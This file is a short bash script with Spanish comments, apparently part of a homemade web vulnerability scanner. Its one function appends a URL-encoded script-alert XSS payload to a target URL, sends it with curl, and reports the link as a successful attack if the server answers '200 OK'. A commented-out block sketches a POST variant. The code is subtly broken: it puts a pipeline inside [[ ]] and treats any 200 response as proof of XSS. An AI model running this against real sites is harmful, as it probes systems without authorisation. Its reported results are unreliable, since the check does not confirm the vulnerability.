#!/bin/bash
function 3_xss(){
#aqui ejecutamos xss con get, checkear si esta search
if [[ $search ]] # | grep 'method=\"GET\"' ]]
then
  XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
  ATTACK="$URL$XSS"
  if [[ curl -i $ATTACK | grep "200 OK" ]]
  then
    echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
  else
    echo "Disculpa, el ataque no ha funcionado."
  fi
#else
 
 # if  [[ curl $URL | grep 'method=\"POST\"' ]]
#  then
  #aqui ejecutamos xss con post, checkear si tambien esta comment
  #  if [[ $comment ]]
 #   then
 #    
#    else
    #  if [[ $search ]]
   #   then
  #      curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
 #     fi
#    fi
 #   if [[ $search ]]
#      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
#      ATTACK="$URL$XSS"
#      curl -i $ATTACK | grep "200 OK"
#  fi      
fi
}